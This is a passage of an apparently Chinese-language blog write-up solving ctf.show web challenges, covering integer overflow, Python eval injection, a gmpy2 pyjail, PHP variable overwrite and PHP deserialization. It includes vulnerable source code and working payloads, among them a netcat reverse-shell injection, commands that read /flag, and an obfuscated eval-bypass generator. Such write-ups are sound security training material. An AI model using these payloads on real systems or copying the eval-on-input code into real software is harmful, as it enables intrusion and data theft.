class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在正常了, 只能用数组整型溢出绕过永真判断, 其他的数值可以看下面的<code>茶歇区</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?0=9223372036854775807# 反正大就是好</span><br></pre></td></tr></table></figure><h2 id="算力超群"><a class="header-anchor" href="#算力超群">¶</a>算力超群</h2><p><code>python eval</code></p><p>计算是后台计算的, 并不能干别的, 但是GET传值, 可以尝试构建错误的传值和错误的页面, 没有渲染就自己构建get请求重新访问</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240626201236473.png" alt="image-20240626201236473"></p><p>在报错页面底下有<code>/app/app.py</code>部分源码(所以是Flask框架), 其中的a和b结合GET传值可以确定是可以控制的, 看上去没有过滤, 传值尝试后发现number1是有过滤的, 而number2是没有过滤的, 尝试用number2进行命令执行</p><blockquote><p>所以为什么hint: 算算算算算算, 我是铁算子r4</p></blockquote><p>因为eval是不回回显的, 所以我尝试用反弹Shell进行后续步骤, 当然也可以把执行的结果塞进文件然后读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?number2=1,__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/sh&#x27;)</span><br></pre></td></tr></table></figure><p>我这里尝试直接发包, 发现连接不了, 还是直接访问才行; 然后在根目录找到flag</p><p>另一种方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 展示文件目录</span><br><span class="line">_calculate?number1=1&amp;operator=%2B&amp;number2=2,__import__(&#x27;os&#x27;).system(&#x27;ls / &gt;/app/templates/hint.html&#x27;)</span><br><span class="line"># 访问 http://7125305f-e54e-406f-91cd-3c92b19e4813.challenge.ctf.show/hint 得到文件目录</span><br><span class="line"></span><br><span class="line"># 读取flag</span><br><span class="line">_calculate?number1=1&amp;operator=%2B&amp;number2=2,__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt;/app/templates/hint.html&#x27;)</span><br><span class="line"># 再次访问hint即可</span><br></pre></td></tr></table></figure><p>附上wp给的源码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2022/11/2</span></span><br><span class="line"><span class="comment"># @Author  : 探姬</span></span><br><span class="line"><span class="comment"># @Forkfrom:https://github.com/helloflask/calculator</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/_calculate&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    a = request.args.get(<span class="string">&#x27;number1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    operator = request.args.get(<span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    b = request.args.get(<span class="string">&#x27;number2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    m = re.<span class="keyword">match</span>(<span class="string">r&#x27;^\-?\d*[.]?\d*$&#x27;</span>, a)</span><br><span class="line">    n = re.<span class="keyword">match</span>(<span class="string">r&#x27;^\-?\d*[.]?\d*$&#x27;</span>, a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> n <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> operator <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;+-*/&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result=<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(a + operator + <span class="built_in">str</span>(<span class="built_in">float</span>(b)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(a + operator + b)</span><br><span class="line">    <span class="keyword">return</span> jsonify(result=result)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hint.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="算力升级"><a class="header-anchor" href="#算力升级">¶</a>算力升级</h2><p><code>gmpy2.__builtins__的命令执行</code>, 嗯, 我觉得比较像模板注入? <a href="https://blog.csdn.net/Jayjay___/article/details/132436072?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171941052216800225522369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171941052216800225522369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-132436072-null-null.142%5Ev100%5Epc_search_result_base2&amp;utm_term=pyjail&amp;spm=1018.2226.3001.4187">PyJail</a></p><p>提示是: 输入算式即可让R4帮你进行计算，本次R4重装升级，已经支持gmpy2了，可以使用gmpy2的函数进行计算，那我们赶快开始吧！</p><p>现在换成了POST, 但是源码直接给到了(上面的标签)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：算力升级--这其实是一个pyjail题目</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re,gmpy2 </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pattern=re.<span class="built_in">compile</span>(<span class="string">r&#x27;\w+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#从code里把单词拿出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#如果不是数字</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#逐个和gmpy2库里的函数名比较</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;你想干什么？<span class="subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;计算成功，答案是<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>源码对于输入的限制是两个正则，要求要么是数字，要么是dir(gmpy2)中的内容. 直接利用本地的py环境进行测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(gmpy2))</span><br><span class="line"><span class="comment"># print(gmpy2.__builtins__)# 发现这里面有eval可以进行命令执行</span></span><br></pre></td></tr></table></figure><p>发现<code>gmpy2.__builtins__</code>是含有<code>eval</code>函数的, 思路就是使用<code>eval</code>和<code>dir(gmpy2)</code>中的内容拼接字符串, 执行以下命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gmpy2.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span>)<span class="comment"># 反正是能执行到就行</span></span><br></pre></td></tr></table></figure><p>只允许<code>gmpy2</code>库中的函数, 我们不能直接用<code>eval</code>, 那就间接用可用函数构造出<code>eval</code>. 这里使用字符串下标操作: <code>'erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]==='eval'</code></p><p><code>'erf'[0]</code> 会得到字符串 <code>erf</code> 的第一个字符，即 <code>e</code><code>'div'[2]</code> 会得到字符串 <code>div</code> 的第三个字符，即 <code>v</code></p><p>不想手动就使用脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span></span><br><span class="line">payload=<span class="string">&quot;gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&quot;</span><span class="comment"># eval已经创建好了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码会在gmpy2的函数名中寻找包含这个字符的最短的函数名，并记录下这个字符在函数名中的位置。然后，这个函数名和字符的位置会被添加到payload字符串中, 特殊字符则直接加入payload</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;/&#x27;(). &quot;</span>:</span><br><span class="line">        temp_index=<span class="number">0</span></span><br><span class="line">        temp_string=<span class="string">&#x27;x&#x27;</span>*<span class="number">20</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):</span><br><span class="line">            <span class="keyword">if</span> j.find(i)&gt;=<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(j)&lt;<span class="built_in">len</span>(temp_string):</span><br><span class="line">                    temp_string=j</span><br><span class="line">                    temp_index=j.find(i)</span><br><span class="line">        payload+=<span class="string">f&#x27;\&#x27;<span class="subst">&#123;temp_string&#125;</span>\&#x27;[<span class="subst">&#123;temp_index&#125;</span>]+&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">f&#x27;\&quot;<span class="subst">&#123;i&#125;</span>\&quot;+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=payload[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&#x27;ai&#x27;[1]+&#x27;agm&#x27;[2]+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;erf&#x27;[1]+&#x27;cot&#x27;[2]+&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cos&#x27;[1]+&#x27;cos&#x27;[2]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;cmp&#x27;[2]+&#x27;erf&#x27;[0]+&#x27;jn&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cot&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;cmp&#x27;[0]+&quot; &quot;+&quot;/&quot;+&#x27;erf&#x27;[2]+&#x27;lcm&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;agm&#x27;[1]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;erf&#x27;[1]+&#x27;erf&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;add&#x27;[1]+&quot;(&quot;+&quot;)&quot;)</span><br></pre></td></tr></table></figure><p>直接输入框就行, 我很好奇为什么我bp发出去不行</p><h2 id="easyPytHon-P"><a class="header-anchor" href="#easyPytHon-P">¶</a>easyPytHon_P</h2><p>源码糊脸</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">cmd: <span class="built_in">str</span> = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">param: <span class="built_in">str</span> = request.form.get(<span class="string">&#x27;param&#x27;</span>)</span><br><span class="line"><span class="comment"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span></span><br><span class="line"><span class="keyword">import</span> subprocess, os</span><br><span class="line"><span class="keyword">if</span> cmd <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> param <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tVar = subprocess.run([cmd[:<span class="number">3</span>], param, __file__], cwd=os.getcwd(), timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No Flag!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>关键在于<code>tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.run: 第一个参数是执行命令</span><br><span class="line">cmd[:3]: 只取cmd这个字符串的前三个字符</span><br><span class="line">__file__: 当前文件路径</span><br><span class="line">cwd=os.getcwd(): 设置子进程的当前目录</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/ccorz/p/Python-subprocess-zhong-derun-fang-fa.html">对于subprocess.run的详细介绍</a></p><p>传参是POST, 通过Flask的<code>request.form.get()</code>方法, 从表单数据中获取’cmd’和’param’的值, 这通常是在POST请求中使用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=ls&amp;param=./# param不能是空的, 否则执行不出来</span><br><span class="line">cmd=cat&amp;param=flag.txt</span><br></pre></td></tr></table></figure><h2 id="遍地飘零"><a class="header-anchor" href="#遍地飘零">¶</a>遍地飘零</h2><p><code>$$值覆盖，$_GET全局变量和本地变量</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zeros</span>=<span class="string">&quot;000000000000000000000000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span>==<span class="string">&quot;000000000000000000000000000000&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;好多零&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后台在接收到GET请求传递过来的参数后，会遍历GET的参数并且赋给<code>$key</code>, 再将<code>$key</code>对应的值给<code>$value</code>; 同时会将GET请求传递的变量名和变量值都作为本地变量的变量名，然后进行值的覆盖, 最后使用<code>var_dump</code>函数输出<code>$_GET</code>的值</p><p>如果<code>$_GET</code>不是本地变量的话，后台会输出GET请求传递过去的参数, 因此<code>$_GET</code>必须是本地变量, 也就是GET请求传递的参数; 同时, 还需要参数值为flag, 才能进行变量覆盖</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure><h2 id="茶歇区"><a class="header-anchor" href="#茶歇区">¶</a>茶歇区</h2><p>正常游戏是无法得到flag的, 源代码审计也没有任何的头绪, 购买只能输入整数, 就先猜测是整形溢出吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 常见的数据类型的取值范围</span><br><span class="line">uint8 -&gt; 0-255</span><br><span class="line">uint16 -&gt; 0-65535</span><br><span class="line">uint32 -&gt; 0-4294967295</span><br><span class="line">uint36 -&gt; 0-18446744073709551615</span><br><span class="line">int8 -&gt; -127-128</span><br><span class="line">int16 -&gt; -32768-32767</span><br><span class="line">int32 -&gt; -2147483648-2147483647</span><br><span class="line">int64 -&gt; -9223372036854775808-9223372036854775807 </span><br></pre></td></tr></table></figure><p>随便塞一个非常大的数字进去, 可以得到回显, 你会发现这个数字是固定的<code>9223372036854775807</code>, 看来是int64了; 但是尝试了挺多次, 都发现就算数字大于int64的极限, 它仍然不计分; 尝试比最大值小一点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原来: 9223372036854775807</span><br><span class="line">现在: 922337203685477580# 也不行</span><br><span class="line">再来: 999999999999999999# 可以了</span><br></pre></td></tr></table></figure><p>虽然可以, 但是为什么分是倒扣的?再发一遍就可以了, 弹窗处获得flag</p><h2 id="小舔田"><a class="header-anchor" href="#小舔田">¶</a>小舔田?</h2><p>反序列化是一个非常好的东西</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;牛夫人&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;nickname==<span class="string">&quot;小甜甜&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname.<span class="string">&quot;。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终目的肯定是<code>Ion_Fan_Princess</code>类中的<code>echo $flag;</code>, 而它在<code>call()</code>中, 找到调用的地方, 显然是本类中的<code>__toString</code>方法;</p><p>那么想要调用这里的<code>__tostring</code>函数，可以利用上面<code>Moon</code>类中的<code>__toString</code>方法，使得<code>$this-&gt;name</code>的值为<code>Ion_Fan_Princess</code>对象, 在<code>wakeup</code>方法中触发<code>__toString</code>方法</p><p>看的头晕可以给你画个图:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627172813673.png" alt="image-20240627172813673"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Moon</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="LSB探姬"><a class="header-anchor" href="#LSB探姬">¶</a>LSB探姬</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：TSTEG-WEB</span></span><br><span class="line"><span class="string"># flag is in /app/flag.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">            f.save(<span class="string">&#x27;upload/&#x27;</span>+f.filename)</span><br><span class="line">            cmd=<span class="string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;cmd&quot;</span>:cmd,<span class="string">&quot;result&quot;</span>:result,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file uploaded!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file upload error!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span 